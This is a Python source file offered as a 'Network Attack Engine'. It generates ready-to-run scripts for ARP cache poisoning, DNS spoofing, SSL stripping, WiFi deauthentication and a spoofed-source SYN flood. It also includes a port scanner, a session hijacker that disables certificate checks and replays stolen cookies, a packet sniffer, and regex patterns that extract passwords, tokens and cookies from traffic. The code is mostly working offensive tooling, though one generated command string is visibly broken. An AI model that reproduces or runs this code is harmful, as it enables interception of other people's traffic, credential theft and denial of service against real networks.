#!/usr/bin/env python3
"""
Network Attack Engine — MITM, ARP spoofing, DNS poisoning, session hijack,
packet crafting, sniffing, TCP/UDP attacks, WiFi deauth, SSL stripping.
"""
from __future__ import annotations
import hashlib, json, os, random, re, socket, struct, sys, time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional
import ssl, urllib.request, urllib.parse

# ── ARP Spoofing ────────────────────────────────────────────────────
def arp_spoof_script(target_ip: str, gateway_ip: str, interface: str = "eth0") -> str:
    """Generate ARP cache poisoning script for MITM attacks."""
    return f'''#!/usr/bin/env python3
"""ARP Cache Poison — {target_ip} <-> {gateway_ip}"""
import scapy.all as scapy, time, sys

def mac(ip):
    ans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip),timeout=2,verbose=0)[0]
    return ans[0][1].hwsrc if ans else sys.exit(f"No MAC for {{ip}}")

t_mac = mac("{target_ip}"); g_mac = mac("{gateway_ip}")
print(f"Poison: {{t_mac}} <-> {{g_mac}}")
while 1:
    scapy.send(scapy.ARP(op=2,pdst="{target_ip}",hwdst=t_mac,psrc="{gateway_ip}"),verbose=0)
    scapy.send(scapy.ARP(op=2,pdst="{gateway_ip}",hwdst=g_mac,psrc="{target_ip}"),verbose=0)
    time.sleep(2)
'''

# ── DNS Poisoning ───────────────────────────────────────────────────
def dns_poison_script(domain: str, redirect_ip: str) -> str:
    """Generate DNS spoofing script via iptables + netfilter queue."""
    return f'''#!/usr/bin/env python3
"""DNS Spoof: {domain} -> {redirect_ip}"""
import netfilterqueue, scapy.all as scapy

def proc(pkt):
    s = scapy.IP(pkt.get_payload())
    if s.haslayer(scapy.DNSQR) and b"{domain}" in s[scapy.DNSQR].qname:
        print(f"[*] Spoofing {{s[scapy.DNSQR].qname.decode()}}")
        ans = scapy.DNSRR(rrname=s[scapy.DNSQR].qname, ttl=300, rdata="{redirect_ip}")
        spoof = scapy.IP(src=s[scapy.IP].dst,dst=s[scapy.IP].src)/\\
                scapy.UDP(sport=53,dport=s[scapy.UDP].sport)/\\
                scapy.DNS(id=s[scapy.DNS].id,qr=1,aa=1,qd=s[scapy.DNS].qd,an=ans)
        pkt.set_payload(bytes(spoof))
    pkt.accept()

nfqueue = netfilterqueue.NetfilterQueue()
nfqueue.bind(0,proc); nfqueue.run()
'''

# ── SSL Strip ───────────────────────────────────────────────────────
def ssl_strip_script(port: int = 8080, redirect_to: int = 80) -> str:
    """SSL stripping proxy script — downgrade HTTPS to HTTP."""
    return f'''#!/usr/bin/env python3
"""SSL Strip — transparent HTTP proxy on port {port} -> {redirect_to}"""
import http.server, socketserver, urllib.request, re

class Stripper(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        url = self.path
        # Strip HTTPS -> HTTP in redirects
        content = urllib.request.urlopen(url).read().decode()
        content = re.sub(r'https://', 'http://', content)
        content = re.sub(r'(action|src|href)=["\\']https://', r'\\1="http://', content)
        self.send_response(200); self.send_header('Content-Type','text/html')
        self.end_headers(); self.wfile.write(content.encode())
    def do_POST(self):
        length = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(length)
        req = urllib.request.Request(self.path, data=body, headers=dict(self.headers))
        resp = urllib.request.urlopen(req)
        self.send_response(resp.status)
        for k,v in resp.headers.items():
            if k.lower() != 'transfer-encoding':
                self.send_header(k,v)
        self.end_headers(); self.wfile.write(resp.read())

socketserver.TCPServer(("0.0.0.0",{port}), Stripper).serve_forever()
'''

# ── WiFi Deauth ─────────────────────────────────────────────────────
def wifi_deauth_script(target_bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF",
                       interface: str = "wlan0mon", count: int = 100) -> str:
    return f'''#!/usr/bin/env python3
"""WiFi Deauth Attack — {target_bssid}"""
import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
pkt = RadioTap()/Dot11(addr1="{client_mac}",addr2="{target_bssid}",addr3="{target_bssid}")/Dot11Deauth(reason=7)
scapy.sendp(pkt,iface="{interface}",count={count},inter=0.1,verbose=1)
print("Deauth sent: {count} packets")
'''

# ── Port Scanner ────────────────────────────────────────────────────
def port_scan(target: str, ports: list[int] = None, threads: int = 200, timeout: float = 2.0) -> dict:
    """Fast multi-threaded TCP port scanner with banner grab.

    Prefer `pentest_recon.port_scan` for richer recon; this keeps the legacy API.
    """
    try:
        import pentest_recon
        res = pentest_recon.port_scan(target, ports=ports, threads=threads, timeout=timeout)
        return {
            "open": [p.port for p in res if p.open],
            "filtered": [],
            "services": {str(p.port): p.banner or p.service_guess for p in res if p.open},
            "details": [p.__dict__ for p in res if p.open],
        }
    except Exception:
        pass
    ports = ports or [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443,9200,11211,27017]
    results = {"open": [], "filtered": [], "services": {}}
    lock = __import__('threading').Lock()

    def scan_one(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            if s.connect_ex((target, port)) == 0:
                try:
                    s.send(b"\r\n")
                    banner = s.recv(1024).decode(errors='replace').strip()[:200]
                except: banner = ""
                with lock:
                    results["open"].append(port)
                    if banner:
                        results["services"][str(port)] = banner
        except: pass
        finally: s.close()

    with ThreadPoolExecutor(min(threads, len(ports))) as ex:
        list(ex.map(scan_one, ports))
    results["open"] = sorted(results["open"])
    return results

# ── TCP SYN Flood ───────────────────────────────────────────────────
TcpFlags = {'FIN':1,'SYN':2,'RST':4,'PSH':8,'ACK':16,'URG':32}

def syn_flood_sample(target: str, port: int, count: int = 1000) -> str:
    """Generate SYN flood script."""
    return f'''#!/usr/bin/env python3
"""SYN Flood — {target}:{port}"""
import socket, random, struct
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
for _ in range({count}):
    src_ip = f"{{random.randint(1,255)}}.{{random.randint(1,255)}}.{{random.randint(1,255)}}.{{random.randint(1,255)}}"
    ip_hdr = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 40, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0,
                          socket.inet_aton(src_ip), socket.inet_aton("{target}"))
    tcp_hdr = struct.pack('!HHLLBBHHH', random.randint(1024,65535), {port}, 0, 0, 0x50, 0x02, 5840, 0, 0)
    s.sendto(ip_hdr + tcp_hdr, ("{target}", {port}))
'''

# ── Session Hijacking ───────────────────────────────────────────────
class SessionHijacker:
    """HTTP session hijacking — cookie capture, replay, CSRF token bypass."""

    def __init__(self):
        self.jar = __import__('http.cookiejar', fromlist=['CookieJar']).CookieJar()
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False; self.ctx.verify_mode = ssl.CERT_NONE
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=self.ctx),
            __import__('urllib.request').HTTPCookieProcessor(self.jar))

    def capture_session(self, url: str) -> dict:
        """Visit target and capture all session cookies."""
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            resp = self.opener.open(req, timeout=10)
            cookies = {}
            for cookie in self.jar:
                cookies[cookie.name] = cookie.value
            return {"url": url, "cookies": cookies,
                    "headers": dict(resp.headers), "status": resp.status}
        except Exception as e:
            return {"error": str(e)[:200]}

    def replay_request(self, url: str, cookies: dict, data: bytes = b"",
                       method: str = "GET") -> dict:
        """Replay request with stolen cookies."""
        try:
            cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
            req = urllib.request.Request(url, data=data,
                headers={'Cookie': cookie_str, 'User-Agent': 'Mozilla/5.0'})
            req.method = method
            resp = self.opener.open(req, timeout=10)
            return {"status": resp.status, "body": resp.read().decode(errors='replace')[:2000]}
        except Exception as e:
            return {"error": str(e)[:200]}

# ── Packet Capturer ─────────────────────────────────────────────────
def packet_sniffer_script(interface: str = "eth0", bpf_filter: str = "tcp port 80",
                          count: int = 0, output_file: str = "capture.pcap") -> str:
    """Generate packet sniffer script."""
    return f'''#!/usr/bin/env python3
"""Packet Sniffer — {interface}, filter: {bpf_filter}"""
import scapy.all as scapy, sys
packets = scapy.sniff(iface="{interface}", filter="{bpf_filter}", count={count})
scapy.wrpcap("{output_file}", packets)
print(f"Captured {{len(packets)}} packets -> {output_file}")
# Quick analysis
for pkt in packets[:20]:
    if pkt.haslayer(scapy.IP):
        print(f"{{pkt[scapy.IP].src}}:{{pkt.sport}} -> {{pkt[scapy.IP].dst}}:{{pkt.dport}}")
'''

# ── Credential Sniffer ──────────────────────────────────────────────
CREDENTIAL_PATTERNS = [
    (r'username=([^&\s]+)', 'username'),
    (r'password=([^&\s]+)', 'password'),
    (r'pass=([^&\s]+)', 'password'),
    (r'email=([^&\s]+)', 'email'),
    (r'token=([^&\s]+)', 'token'),
    (r'Authorization:\s*Basic\s+(\S+)', 'basic_auth'),
    (r'Authorization:\s*Bearer\s+(\S+)', 'bearer_token'),
    (r'set-cookie:\s*([^;]+)', 'cookie'),
]

def extract_credentials_from_pcap(pcap_text: str) -> list[dict]:
    """Extract credentials from raw HTTP traffic text."""
    findings = []
    for pattern, cred_type in CREDENTIAL_PATTERNS:
        for match in re.finditer(pattern, pcap_text, re.IGNORECASE):
            findings.append({"type": cred_type, "value": match.group(1)})
    return findings

# ── Network Attack Suite Entry ──────────────────────────────────────
def network_attack_report(target: str) -> dict:
    """Run a comprehensive network attack scan against a target."""
    report = {"target": target, "timestamp": datetime.now().isoformat()}
    # Port scan
    try:
        report["ports"] = port_scan(target, threads=100)
    except Exception as e:
        report["ports_error"] = str(e)[:100]
    # HTTP analysis
    if 80 in report.get("ports", {}).get("open", []) or \
       443 in report.get("ports", {}).get("open", []):
        scheme = "https" if 443 in report.get("ports", {}).get("open", []) else "http"
        hijacker = SessionHijacker()
        sess = hijacker.capture_session(f"{scheme}://{target}/")
        report["session"] = sess
    # Generate attack scripts
    report["scripts"] = {
        "arp_spoof": f"python -c 'import attack_network..." f"arp_spoof_script(\"{target}\",\"{target}\")'",
        "port_scan": f"python -c 'from attack_network import port_scan; print(port_scan(\"{target}\"))'",
    }
    return report

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        if cmd == "scan":
            host = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
            print(json.dumps(port_scan(host), indent=2))
        elif cmd == "hijack":
            url = sys.argv[2] if len(sys.argv) > 2 else "http://example.com"
            h = SessionHijacker()
            print(json.dumps(h.capture_session(url), indent=2))
        elif cmd == "arp":
            print(arp_spoof_script(sys.argv[2] if len(sys.argv)>2 else "192.168.1.5",
                                   sys.argv[3] if len(sys.argv)>3 else "192.168.1.1"))
        elif cmd == "dns":
            print(dns_poison_script(sys.argv[2] if len(sys.argv)>2 else "example.com",
                                    sys.argv[3] if len(sys.argv)>3 else "10.0.0.1"))
        elif cmd == "wifi":
            print(wifi_deauth_script(sys.argv[2] if len(sys.argv)>2 else "00:11:22:33:44:55"))
        else:
            r = network_attack_report(sys.argv[2] if len(sys.argv)>2 else "127.0.0.1")
            print(json.dumps(r, indent=2))
    else:
        print("Usage: python attack_network.py <scan|hijack|arp|dns|wifi> [target]")
